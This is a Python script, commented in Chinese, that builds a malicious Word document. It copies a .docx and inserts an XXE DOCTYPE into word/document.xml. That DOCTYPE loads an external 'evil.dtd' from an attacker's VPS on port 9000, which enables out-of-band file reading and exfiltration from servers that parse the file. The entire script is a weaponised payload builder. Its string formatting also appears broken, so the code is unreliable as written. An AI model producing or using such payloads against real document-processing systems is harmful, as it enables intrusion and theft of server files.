#!/usr/bin/env python3
"""在 docx 的 word/document.xml 注入 XXE 外部实体（保持 zip 结构完整）"""
import sys, zipfile, shutil, os

def main():
    src = sys.argv[1] if len(sys.argv) > 1 else 'in.docx'
    dst = sys.argv[2] if len(sys.argv) > 2 else 'out.docx'
    vps = sys.argv[3] if len(sys.argv) > 3 else '<VPS>'
    doctype = ('<!DOCTYPE r [<!ENTITY % dtd SYSTEM "http://%s:9000/evil.dtd"> %%dtd;]>' % vps)
    shutil.copyfile(src, dst + '.tmp')
    with zipfile.ZipFile(dst + '.tmp') as zin, zipfile.ZipFile(dst, 'w', zipfile.ZIP_DEFLATED) as zout:
        for item in zin.infolist():
            data = zin.read(item.filename)
            if item.filename == 'word/document.xml':
                text = data.decode('utf-8', 'ignore')
                i = text.find('<w:document')
                if i < 0:
                    i = text.find('<?xml')
                text = text[:i] + doctype + text[i:]
                data = text.encode('utf-8')
            zout.writestr(item, data)
    os.remove(dst + '.tmp')
    print('written', dst)

if __name__ == '__main__':
    main()
